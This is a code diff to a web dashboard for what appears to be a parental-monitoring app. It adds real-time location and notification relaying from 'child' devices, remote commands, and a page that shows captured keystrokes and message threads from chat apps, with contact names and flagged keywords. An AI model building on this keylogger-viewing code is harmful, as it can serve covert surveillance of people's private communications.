@@ -46,6 +46,11 @@ const sidebar = document.getElementById('sidebar');
 let autoRefreshInterval = null;
 const AUTO_REFRESH_MS = 30000;
 
+// === REAL-TIME SYNC WEBSOCKET ===
+let syncSocket = null;
+let syncReconnectAttempts = 0;
+const MAX_RECONNECT_ATTEMPTS = 10;
+
 // Toast notification system
 function showToast(message, type = 'info', duration = 4000) {
   // Remove existing toast
@@ -107,6 +112,259 @@ function stopAutoRefresh() {
   if (autoRefreshInterval) {
     clearInterval(autoRefreshInterval);
     autoRefreshInterval = null;
+  }
+}
+
+// === REAL-TIME SYNC FUNCTIONS ===
+// Connect to WebSocket for instant notifications from child devices
+
+function connectRealtimeSync() {
+  if (!authToken || !currentUser) {
+    console.log('[Sync] Not authenticated - skipping sync connection');
+    return;
+  }
+  
+  // Close existing connection
+  if (syncSocket && syncSocket.readyState === WebSocket.OPEN) {
+    syncSocket.close();
+  }
+  
+  const userId = currentUser._id || currentUser.id;
+  const wsUrl = `${WS_BASE}?role=sync&device_type=parent&device_id=${userId}`;
+  
+  console.log('[Sync] Connecting to real-time sync:', wsUrl);
+  
+  try {
+    syncSocket = new WebSocket(wsUrl);
+    
+    syncSocket.onopen = () => {
+      console.log('[Sync] Connected to real-time sync');
+      syncReconnectAttempts = 0;
+      
+      // Authenticate
+      syncSocket.send(JSON.stringify({
+        type: 'auth',
+        device_type: 'parent',
+        user_id: userId,
+        parent_id: userId,
+        timestamp: Date.now()
+      }));
+    };
+    
+    syncSocket.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        handleRealtimeMessage(data);
+      } catch (e) {
+        console.error('[Sync] Error parsing message:', e);
+      }
+    };
+    
+    syncSocket.onclose = () => {
+      console.log('[Sync] Disconnected from real-time sync');
+      scheduleReconnect();
+    };
+    
+    syncSocket.onerror = (error) => {
+      console.error('[Sync] WebSocket error:', error);
+    };
+    
+  } catch (error) {
+    console.error('[Sync] Error connecting:', error);
+    scheduleReconnect();
+  }
+}
+
+function scheduleReconnect() {
+  if (syncReconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
+    console.warn('[Sync] Max reconnect attempts reached');
+    return;
+  }
+  
+  syncReconnectAttempts++;
+  const delay = Math.min(5000 * syncReconnectAttempts, 60000);
+  
+  console.log(`[Sync] Reconnecting in ${delay}ms (attempt ${syncReconnectAttempts})`);
+  
+  setTimeout(() => {
+    if (authToken && currentUser) {
+      connectRealtimeSync();
+    }
+  }, delay);
+}
+
+function handleRealtimeMessage(data) {
+  const type = data.type;
+  console.log('[Sync] Received:', type);
+  
+  switch (type) {
+    case 'auth_success':
+      console.log('[Sync] Authenticated - online devices:', data.online_devices);
+      // Update device online status
+      if (data.online_devices) {
+        updateDevicesOnlineStatus(data.online_devices);
+      }
+      break;
+      
+    case 'child_notification':
+      // INSTANT notification from child device!
+      console.log('[Sync] Real-time notification:', data.notification);
+      handleInstantNotification(data.device_id, data.notification);
+      break;
+      
+    case 'location_update':
+      // INSTANT location update
+      console.log('[Sync] Real-time location:', data.location);
+      handleInstantLocation(data.device_id, data.location);
+      break;
+      
+    case 'device_online':
+      console.log('[Sync] Device online:', data.device_id);
+      updateDeviceStatus(data.device_id, true);
+      break;
+      
+    case 'device_offline':
+      console.log('[Sync] Device offline:', data.device_id);
+      updateDeviceStatus(data.device_id, false);
+      break;
+      
+    case 'command_sent':
+      console.log('[Sync] Command sent successfully');
+      break;
+      
+    case 'command_sent_fcm':
+      console.log('[Sync] Command sent via FCM (device offline)');
+      showToast('Command sent (device will receive when online)', 'info');
+      break;
+      
+    case 'command_failed':
+      console.error('[Sync] Command failed:', data.error);
+      showToast(`Command failed: ${data.error}`, 'error');
+      break;
+      
+    case 'ping':
+      // Respond to server ping
+      if (syncSocket && syncSocket.readyState === WebSocket.OPEN) {
+        syncSocket.send(JSON.stringify({
+          type: 'pong',
+          timestamp: Date.now()
+        }));
+      }
+      break;
+  }
+}
+
+function handleInstantNotification(deviceId, notification) {
+  // Play notification sound
+  try {
+    const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleP//');
+    audio.volume = 0.3;
+    audio.play().catch(() => {});
+  } catch (e) {}
+  
+  // Show desktop notification if permitted
+  if (Notification.permission === 'granted') {
+    new Notification(`${notification.appName || 'Notification'}`, {
+      body: `${notification.title || ''}\n${notification.text || ''}`,
+      icon: '/icon.png',
+      tag: `notif-${Date.now()}`
+    });
+  }
+  
+  // Show in-app toast
+  showToast(`📱 ${notification.appName}: ${notification.title || notification.text}`, 'info', 5000);
+  
+  // If on notifications page, refresh list
+  const notifPage = document.getElementById('notificationsPage');
+  if (notifPage && !notifPage.classList.contains('hidden')) {
+    loadNotifications();
+  }
+  
+  // Update dashboard notification count
+  updateDashboardNotificationBadge();
+}
+
+function handleInstantLocation(deviceId, location) {
+  // Update map if on location page
+  if (selectedDevice && getDeviceId(selectedDevice) === deviceId) {
+    const locationPage = document.getElementById('locationPage');
+    if (locationPage && !locationPage.classList.contains('hidden')) {
+      updateMapWithLocation(location);
+    }
+  }
+}
+
+function updateDeviceStatus(deviceId, isOnline) {
+  // Find device and update status
+  const device = devices.find(d => getDeviceId(d) === deviceId || d.deviceId === deviceId);
+  if (device) {
+    device.isOnline = isOnline;
+    
+    // Update UI if this is the selected device
+    if (selectedDevice && (getDeviceId(selectedDevice) === deviceId || selectedDevice.deviceId === deviceId)) {
+      const statusEl = document.getElementById('deviceStatus');
+      if (statusEl) {
+        statusEl.innerHTML = isOnline 
+          ? '<span class="status-online"><i class="fas fa-circle"></i> Online</span>'
+          : '<span class="status-offline"><i class="fas fa-circle"></i> Offline</span>';
+      }
+    }
+  }
+  
+  // Show toast
+  showToast(isOnline ? '🟢 Device is online' : '🔴 Device went offline', isOnline ? 'success' : 'warning', 3000);
+}
+
+function updateDevicesOnlineStatus(onlineDeviceIds) {
+  devices.forEach(device => {
+    const id = device.deviceId || getDeviceId(device);
+    device.isOnline = onlineDeviceIds.includes(id);
+  });
+}
+
+function updateDashboardNotificationBadge() {
+  // Increment unread count badge if exists
+  const badge = document.querySelector('.notification-badge');
+  if (badge) {
+    const count = parseInt(badge.textContent || '0') + 1;
+    badge.textContent = count;
+    badge.style.display = 'block';
+  }
+}
+
+function updateMapWithLocation(location) {
+  // Update the map marker if map is initialized
+  if (window.map && location) {
+    const latlng = [location.latitude, location.longitude];
+    if (window.deviceMarker) {
+      window.deviceMarker.setLatLng(latlng);
+    } else {
+      window.deviceMarker = L.marker(latlng).addTo(window.map);
+    }
+    window.map.setView(latlng, 15);
+  }
+}
+
+// Send command via WebSocket (real-time) with fallback to REST API
+function sendCommandViaSync(deviceId, command, params = {}) {
+  if (syncSocket && syncSocket.readyState === WebSocket.OPEN) {
+    syncSocket.send(JSON.stringify({
+      type: 'command',
+      target_device_id: deviceId,
+      command: command,
+      params: params,
+      message_id: Date.now(),
+      timestamp: Date.now()
+    }));
+    return true;
+  }
+  return false;
+}
+
+function disconnectRealtimeSync() {
+  if (syncSocket) {
+    syncSocket.close();
+    syncSocket = null;
   }
 }
 
@@ -414,6 +672,13 @@ function handleLogout() {
   currentUser = null;
   devices = [];
   selectedDevice = null;
+  
+  // Disconnect from real-time sync
+  disconnectRealtimeSync();
+  
+  // Stop auto-refresh
+  stopAutoRefresh();
+  
   showLoginPage();
 }
 
@@ -424,6 +689,14 @@ async function loadUserData() {
     document.getElementById('userName').textContent = currentUser.name;
     
     await loadDevices();
+    
+    // Connect to real-time sync WebSocket for instant notifications
+    connectRealtimeSync();
+    
+    // Request browser notification permission
+    if (Notification.permission === 'default') {
+      Notification.requestPermission();
+    }
     
     if (devices.length > 0) {
       selectedDevice = devices[0];
@@ -552,6 +825,9 @@ function navigateTo(page) {
         break;
       case 'webhistory':
         loadWebHistory();
+        break;
+      case 'keystrokes':
+        loadKeystrokes();
         break;
       case 'settings':
         loadSettings();
@@ -4370,3 +4646,353 @@ async function captureScreenshotFromPage() {
   }
 }
 
+// ============================================
+// KEYSTROKE MONITORING FUNCTIONS
+// ============================================
+
+let keystrokeSessions = [];
+let keystrokePage = 1;
+let keystrokeFilters = {
+  risk: 'all',
+  app: 'all',
+  search: ''
+};
+
+// Load keystrokes page
+async function loadKeystrokes() {
+  if (!selectedDevice) {
+    document.getElementById('keystrokeSessions').innerHTML = '<p class="empty-state">Select a device first</p>';
+    return;
+  }
+  
+  keystrokePage = 1;
+  keystrokeFilters = { risk: 'all', app: 'all', search: '' };
+  
+  // Setup event listeners
+  setupKeystrokeListeners();
+  
+  // Load data
+  await fetchKeystrokeSessions();
+}
+
+// Setup keystroke page event listeners
+function setupKeystrokeListeners() {
+  // Refresh button
+  document.getElementById('btnRefreshKeystrokes')?.addEventListener('click', async () => {
+    const btn = document.getElementById('btnRefreshKeystrokes');
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+    
+    keystrokePage = 1;
+    await fetchKeystrokeSessions();
+    
+    btn.disabled = false;
+    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
+  });
+  
+  // Risk filter chips
+  document.querySelectorAll('#riskFilter .chip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      document.querySelectorAll('#riskFilter .chip').forEach(c => c.classList.remove('active'));
+      chip.classList.add('active');
+      keystrokeFilters.risk = chip.dataset.risk;
+      keystrokePage = 1;
+      fetchKeystrokeSessions();
+    });
+  });
+  
+  // App filter chips
+  document.querySelectorAll('#appFilter .chip').forEach(chip => {
+    chip.addEventListener('click', (e) => {
+      if (!e.target.dataset.app) return;
+      document.querySelectorAll('#appFilter .chip').forEach(c => c.classList.remove('active'));
+      e.target.classList.add('active');
+      keystrokeFilters.app = e.target.dataset.app;
+      keystrokePage = 1;
+      fetchKeystrokeSessions();
+    });
+  });
+  
+  // Search
+  let searchTimeout;
+  document.getElementById('keystrokeSearch')?.addEventListener('input', (e) => {
+    clearTimeout(searchTimeout);
+    searchTimeout = setTimeout(() => {
+      keystrokeFilters.search = e.target.value;
+      keystrokePage = 1;
+      fetchKeystrokeSessions();
+    }, 300);
+  });
+  
+  // Load more button
+  document.getElementById('loadMoreKeystrokes')?.addEventListener('click', () => {
+    keystrokePage++;
+    fetchKeystrokeSessions(true);
+  });
+  
+  // Modal close
+  document.getElementById('closeKeystrokeModal')?.addEventListener('click', closeKeystrokeModal);
+  document.querySelector('#keystrokeDetailModal .modal-backdrop')?.addEventListener('click', closeKeystrokeModal);
+}
+
+// Fetch keystroke sessions from API
+async function fetchKeystrokeSessions(append = false) {
+  if (!selectedDevice) return;
+  
+  try {
+    const deviceId = getDeviceId(selectedDevice);
+    let url = `/sync/keystrokes/${deviceId}?page=${keystrokePage}&limit=20`;
+    
+    if (keystrokeFilters.risk !== 'all') {
+      url += `&riskLevel=${keystrokeFilters.risk}`;
+    }
+    if (keystrokeFilters.app !== 'all') {
+      url += `&app=${keystrokeFilters.app}`;
+    }
+    if (keystrokeFilters.search) {
+      url += `&contact=${encodeURIComponent(keystrokeFilters.search)}`;
+    }
+    
+    const response = await api(url);
+    
+    if (!append) {
+      keystrokeSessions = response.sessions || [];
+    } else {
+      keystrokeSessions = [...keystrokeSessions, ...(response.sessions || [])];
+    }
+    
+    // Update stats
+    updateKeystrokeStats(response.stats);
+    
+    // Update UI
+    renderKeystrokeSessions();
+    
+    // Update high risk alerts
+    updateHighRiskAlerts(response.sessions || []);
+    
+    // Show/hide load more button
+    const loadMoreBtn = document.getElementById('loadMoreKeystrokes');
+    if (loadMoreBtn) {
+      const hasMore = (keystrokePage * 20) < response.total;
+      loadMoreBtn.classList.toggle('hidden', !hasMore);
+    }
+    
+    // Update badge
+    if (response.stats?.highRiskCount > 0) {
+      const badge = document.getElementById('keystrokeBadge');
+      if (badge) {
+        badge.textContent = response.stats.highRiskCount;
+        badge.style.display = 'inline';
+      }
+    }
+    
+  } catch (error) {
+    console.error('Failed to fetch keystrokes:', error);
+    if (!append) {
+      document.getElementById('keystrokeSessions').innerHTML = 
+        '<p class="empty-state">Failed to load keystroke data</p>';
+    }
+  }
+}
+
+// Update stats display
+function updateKeystrokeStats(stats) {
+  if (!stats) return;
+  
+  document.getElementById('totalKeystrokeSessions').textContent = stats.totalSessions || 0;
+  document.getElementById('totalKeystrokeMessages').textContent = stats.totalMessages || 0;
+  document.getElementById('highRiskCount').textContent = stats.highRiskCount || 0;
+  document.getElementById('mediumRiskCount').textContent = stats.mediumRiskCount || 0;
+  
+  // Highlight cards if there are risks
+  document.getElementById('highRiskCard')?.classList.toggle('highlight', stats.highRiskCount > 0);
+  document.getElementById('mediumRiskCard')?.classList.toggle('highlight', stats.mediumRiskCount > 0);
+}
+
+// Update high risk alerts section
+function updateHighRiskAlerts(sessions) {
+  const highRiskSessions = sessions.filter(s => s.riskLevel === 'HIGH');
+  const alertsSection = document.getElementById('highRiskAlerts');
+  const alertList = document.getElementById('alertList');
+  
+  if (highRiskSessions.length === 0) {
+    alertsSection?.classList.add('hidden');
+    return;
+  }
+  
+  alertsSection?.classList.remove('hidden');
+  
+  alertList.innerHTML = highRiskSessions.slice(0, 5).map(session => `
+    <div class="alert-item" onclick="openKeystrokeSession('${session.sessionId}')">
+      <i class="fas fa-exclamation-triangle alert-icon"></i>
+      <div class="alert-info">
+        <div class="alert-app">${escapeHtml(session.appName)}</div>
+        <div class="alert-contact">${escapeHtml(session.contactName)}</div>
+      </div>
+      <div class="alert-keywords">
+        ${session.flaggedKeywords.slice(0, 3).map(kw => 
+          `<span class="keyword-tag">${escapeHtml(kw)}</span>`
+        ).join('')}
+      </div>
+    </div>
+  `).join('');
+}
+
+// Render keystroke sessions list
+function renderKeystrokeSessions() {
+  const container = document.getElementById('keystrokeSessions');
+  
+  if (!keystrokeSessions.length) {
+    container.innerHTML = '<p class="empty-state">No keystroke sessions found</p>';
+    return;
+  }
+  
+  container.innerHTML = keystrokeSessions.map(session => {
+    const appIcon = getAppIcon(session.appPackage);
+    const appIconClass = getAppIconClass(session.appPackage);
+    const previewText = session.messages?.slice(-3).map(m => m.text).join(' ') || '';
+    const timeRange = formatTimeRange(session.firstMessageTime, session.lastMessageTime);
+    
+    return `
+      <div class="keystroke-session-card ${session.riskLevel.toLowerCase()}-risk" 
+           onclick="openKeystrokeSession('${session.sessionId}')">
+        <div class="session-header">
+          <div class="session-app-info">
+            <div class="session-app-icon ${appIconClass}">
+              <i class="${appIcon}"></i>
+            </div>
+            <div>
+              <div class="session-app-name">${escapeHtml(session.appName)}</div>
+              <div class="session-contact-name">${escapeHtml(session.contactName)}</div>
+            </div>
+          </div>
+          <span class="session-risk-badge ${session.riskLevel.toLowerCase()}">${session.riskLevel}</span>
+        </div>
+        <div class="session-preview">${escapeHtml(previewText.substring(0, 150))}${previewText.length > 150 ? '...' : ''}</div>
+        <div class="session-meta">
+          <span><i class="fas fa-comment"></i> ${session.messageCount} messages</span>
+          <span><i class="fas fa-clock"></i> ${timeRange}</span>
+        </div>
+      </div>
+    `;
+  }).join('');
+}
+
+// Get app icon based on package name
+function getAppIcon(packageName) {
+  const iconMap = {
+    'com.whatsapp': 'fab fa-whatsapp',
+    'com.whatsapp.w4b': 'fab fa-whatsapp',
+    'org.telegram.messenger': 'fab fa-telegram',
+    'com.instagram.android': 'fab fa-instagram',
+    'com.facebook.orca': 'fab fa-facebook-messenger',
+    'com.snapchat.android': 'fab fa-snapchat',
+    'com.discord': 'fab fa-discord',
+    'com.android.chrome': 'fab fa-chrome',
+    'org.mozilla.firefox': 'fab fa-firefox',
+  };
+  return iconMap[packageName] || 'fas fa-mobile-alt';
+}
+
+// Get app icon CSS class
+function getAppIconClass(packageName) {
+  const classMap = {
+    'com.whatsapp': 'whatsapp',
+    'com.whatsapp.w4b': 'whatsapp',
+    'org.telegram.messenger': 'telegram',
+    'com.instagram.android': 'instagram',
+    'com.facebook.orca': 'messenger',
+    'com.snapchat.android': 'snapchat',
+    'com.discord': 'discord',
+    'com.android.chrome': 'browser',
+    'org.mozilla.firefox': 'browser',
+  };
+  return classMap[packageName] || '';
+}
+
+// Format time range display
+function formatTimeRange(start, end) {
+  const startDate = new Date(start);
+  const endDate = new Date(end);
+  const now = new Date();
+  const diffMs = now - endDate;
+  
+  // If within last 24 hours, show relative time
+  if (diffMs < 24 * 60 * 60 * 1000) {
+    const mins = Math.floor(diffMs / 60000);
+    if (mins < 60) return `${mins}m ago`;
+    const hours = Math.floor(mins / 60);
+    return `${hours}h ago`;
+  }
+  
+  // Otherwise show date
+  return startDate.toLocaleDateString();
+}
+
+// Open keystroke session detail modal
+async function openKeystrokeSession(sessionId) {
+  const session = keystrokeSessions.find(s => s.sessionId === sessionId);
+  if (!session) return;
+  
+  const modal = document.getElementById('keystrokeDetailModal');
+  
+  // Populate modal
+  document.getElementById('modalContactName').textContent = session.contactName;
+  document.getElementById('modalAppName').innerHTML = 
+    `<i class="${getAppIcon(session.appPackage)}"></i> ${session.appName}`;
+  
+  const riskBadge = document.getElementById('modalRiskBadge');
+  riskBadge.textContent = session.riskLevel;
+  riskBadge.className = `risk-badge ${session.riskLevel}`;
+  
+  document.getElementById('modalMessageCount').innerHTML = 
+    `<i class="fas fa-comment"></i> ${session.messageCount} messages`;
+  
+  document.getElementById('modalTimeRange').innerHTML = 
+    `<i class="fas fa-clock"></i> ${new Date(session.firstMessageTime).toLocaleString()} - ${new Date(session.lastMessageTime).toLocaleTimeString()}`;
+  
+  // Flagged keywords
+  const keywordsSection = document.getElementById('modalFlaggedKeywords');
+  const keywordTags = document.getElementById('keywordTags');
+  
+  if (session.flaggedKeywords?.length > 0) {
+    keywordsSection.classList.remove('hidden');
+    keywordTags.innerHTML = session.flaggedKeywords.map(kw => 
+      `<span class="tag">${escapeHtml(kw)}</span>`
+    ).join('');
+  } else {
+    keywordsSection.classList.add('hidden');
+  }
+  
+  // Render messages
+  const threadContainer = document.getElementById('modalMessageThread');
+  threadContainer.innerHTML = (session.messages || []).map(msg => {
+    const isFlagged = session.flaggedKeywords?.some(kw => 
+      msg.text.toLowerCase().includes(kw.toLowerCase())
+    );
+    
+    return `
+      <div class="message-bubble ${isFlagged ? 'flagged' : ''}">
+        <div class="message-text">${escapeHtml(msg.text)}</div>
+        <div class="message-time">${new Date(msg.timestamp).toLocaleTimeString()}</div>
+        ${msg.fieldType !== 'text' ? `<div class="message-type">${msg.fieldType}</div>` : ''}
+      </div>
+    `;
+  }).join('');
+  
+  // Show modal
+  modal.classList.remove('hidden');
+}
+
+// Close keystroke modal
+function closeKeystrokeModal() {
+  document.getElementById('keystrokeDetailModal')?.classList.add('hidden');
+}
+
+// Escape HTML for safe rendering
+function escapeHtml(text) {
+  if (!text) return '';
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
